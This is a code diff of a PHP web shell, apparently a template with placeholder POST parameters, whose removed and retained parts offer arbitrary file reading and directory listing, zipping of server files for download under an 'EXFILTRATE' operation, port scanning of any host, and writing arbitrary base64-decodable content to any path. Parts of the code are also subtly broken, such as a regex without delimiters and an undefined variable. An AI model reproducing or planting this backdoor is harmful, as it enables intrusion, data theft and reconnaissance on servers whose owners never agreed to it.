-            }
-        }
-    }
-
-    return $results;
-}
-
-function check_permissions($path)
-{
-    if (!is_readable($path)) {
-        echo "Error: Cannot access '$path' (no read permission).\n";
-        return;
-    }
-
-    $perms = fileperms($path);
-    $readable = ($perms & 0444) ? 'R' : '-';                   // Check read bits
-    $writable = ($perms & 0222) ? 'W' : '-';                   // Check write bits
-    $executable = ($perms & 0111) && !is_dir($path) ? 'X' : '-'; // Check execute bits (only for files)
-
-    echo "$path: $readable$writable$executable\n";
-
-    if (is_dir($path) && is_readable($path)) {
-        $dir_handle = opendir($path);
-        while (($file = readdir($dir_handle)) !== false) {
-            if ($file !== '.' && $file !== '..') {
-                $sub_path = "$path/$file";
-                if (is_readable($sub_path)) {
-                    echo "- $sub_path\n";
-                } else {
-                    echo "- (No read permission for $sub_path)\n";
-                }
-            }
-        }
-        closedir($dir_handle);
-    }
-}
-
-function get_shortest_common_path($paths)
-{
-    if (empty($paths)) {
-        return null;
-    }
-
-    $shortest_path = $paths[0]; // Initialize with first path
-
-    foreach ($paths as $path) {
-        $common_path = '';
-        $path_segments = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR)); // Split path by separator
-        $shortest_segments = explode(DIRECTORY_SEPARATOR, trim($shortest_path, DIRECTORY_SEPARATOR));
-
-        $min_length = min(count($path_segments), count($shortest_segments));
-        for ($i = 0; $i < $min_length; $i++) {
-            if ($path_segments[$i] === $shortest_segments[$i]) {
-                $common_path .= $path_segments[$i] . DIRECTORY_SEPARATOR;
-            } else {
-                break;
-            }
-        }
-
-        $shortest_path = $common_path; // Update shortest path if shorter common path found
-    }
-
-    return rtrim($shortest_path, DIRECTORY_SEPARATOR); // Remove trailing separator if present
-}
-
-/**
- * Handle the zip creation process
- * @return void
- */
-function handleCreateZip()
-{
-    $content = $_POST['__PARAM_1__'];
-
-    $zip = new ZipArchive();
-    $zip_name = tempnam(sys_get_temp_dir(), "__RANDOM_5_STRING__");
-
-    if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
-        echo "Error: Could not create temporary archive.";
-        return;
-    }
-
-    $lines = explode("\n", $content);
-    $path_replacement = get_shortest_common_path($lines);
-    foreach ($lines as $line) {
-        $parts = explode(',', trim($line)); // Split line by comma
-        $path = isset($parts[0]) ? $parts[0] : '';
-
-        $recursive = in_array('with_tree', $parts);
-        $extensions = array();
-
-        foreach ($parts as $part) {
-            if (strpos($part, 'extension=') === 0) {
-                $extensions = explode("|", strtolower(trim(substr($part, 10))));
-                break;
-            }
-        }
-
-        if ($path) {
-            if (
-                is_file($path) &&
-                ($extensions === array() || in_array(strtolower(pathinfo($path, PATHINFO_EXTENSION)), $extensions))
-            ) {
-                $zip->addFile(
-                    $path,
-                    preg_replace("^\\\\", "", str_replace('\\', '/', basename($path)))
-                ); // Add file with original name
-            } else {
-                if (is_dir($path) && is_readable($path)) {
-                    addDirectoryToZip($path, $zip, $recursive, $extensions, $path_replacement . DIRECTORY_SEPARATOR);
-                }
-            }
-        }
-    }
-
-    $zip->close();
-
-    $file_size = filesize($zip_name);
-    $chunk_size = 4096; // Adjust chunk size as needed
-
-    header('Content-Description: File Transfer');
-    header('Content-Type: application/octet-stream'); // Adjust content type if needed
-    header('Content-Disposition: attachment; filename="' . basename($zip_name) . '"');
-    header('Content-Transfer-Encoding: chunked');
-    header('Content-Length: ' . $file_size); // Optional: Set content length for progress tracking
-
-    $file_handle = fopen($zip_name, 'rb');
-
-    while (!feof($file_handle)) {
-        $chunk = fread($file_handle, $chunk_size);
-        echo $chunk; // Add CRLF after each chunk
-        flush();     // Flush output buffer after sending each chunk
-    }
-
-    fclose($file_handle);
-    unlink($zip_name); // Delete temporary zip file;
-}
-
-/**
- * Add a directory to a zip archive
- * @param $dir string Directory to add
- * @param $zip ZipArchive Zip archive to add to
- * @param $recursive bool Whether to add the directory recursively
- * @param $extensions string[] Extensions to include
- * @param $cleanup_path string Path to cleanup
- * @return void
- */
-function addDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = "")
-{
-    $dir_handle = opendir($dir);
-
-    while (($file = readdir($dir_handle)) !== false) {
-        if ($file !== '.' && $file !== '..') {
-            $sub_path = "$dir/$file";
-
-            if (
-                is_file($sub_path) &&
-                ($extensions === array() || in_array(strtolower(pathinfo($path, PATHINFO_EXTENSION)), $extensions))
-            ) {
-                $zip->addFile(
-                    $sub_path,
-                    preg_replace(
-                        "^\\\\",
-                        "",
-                        str_replace('\\', '/', str_replace($cleanup_path, '', $sub_path))
-                    )
-                ); // Add with relative path within zip
-            } else {
-                if ($recursive && is_dir($sub_path) && is_readable($sub_path)) {
-                    addDirectoryToZip($sub_path, $zip, $recursive, $extensions, $cleanup_path);
-                }
-            }
-        }
-    }
-
-    closedir($dir_handle);
-}
-
-/**
- * Handle the port scan operation
- * @return void
- */
-function handlePortScan()
-{
-    $host = $_POST['__PARAM_1__'];
-    $startPort = intval($_POST['__PARAM_2__']);
-    $endPort = intval($_POST['__PARAM_3__']);
-
-    out("Scanning ports $startPort to $endPort on $host...");
-
-    // Loop through the port range
-    for ($port = $startPort; $port <= $endPort; $port++) {
-        // Attempt to connect to the host on the current port
-        $socket = @fsockopen($host, $port, $errno, $errstr, 1);
-
-        // Check if the connection was successful
-        if ($socket) {
-            // The port is open
-            fclose($socket);
-            out("Port $port: OPEN");
-        } else {
-            // The port is closed or unreachable
-            out("Port $port: CLOSED / UNREACHABLE (err: $errstr)");
-        }
-        flush();
-    }
-}
-
-/**
- * Handle the write file operation
- * @return void
- */
-function handleWriteFile()
-{
-    $filename = $_POST['__PARAM_1__'];
-    $should_decode_from_b64 = isCheckboxActive("__PARAM_3__");
-    $content = $should_decode_from_b64 ? base64_decode($_POST['__PARAM_2__']) : $_POST['__PARAM_2__'];
-
-    out(array(
-        "Received content of length " . strlen($content) . " bytes.",
-        "Writing to $filename ..."
-    ));
-
-    file_put_contents($filename, $content);
-    out("File written successfully.");
-}
-
 if (isPost()) {
     $operation = $_POST["__OPERATION__"];
 
     switch ($operation) {
+        case FILE_EXTRACTION_PREVIEW:
         case FILE_EXTRACTION:
-            check_and_print_file(
-                $_POST["__PARAM_1__"],
-                $_POST["__PARAM_2__"],
-                $_POST["__PARAM_3__"]
-            );
+            handleFileExtraction();
             break;
         case DIRECTORY_LISTING:
-            $result = getDirContents($_POST["__PARAM_1__"]);
-            foreach ($result as $e) {
-                echo "$e\n";
-            }
-            break;
-        case PERMISSION_CHECK:
-            check_permissions($_POST["__PARAM_1__"]);
+            handleDirectoryListing();
             break;
         case EXFILTRATE:
             handleCreateZip();
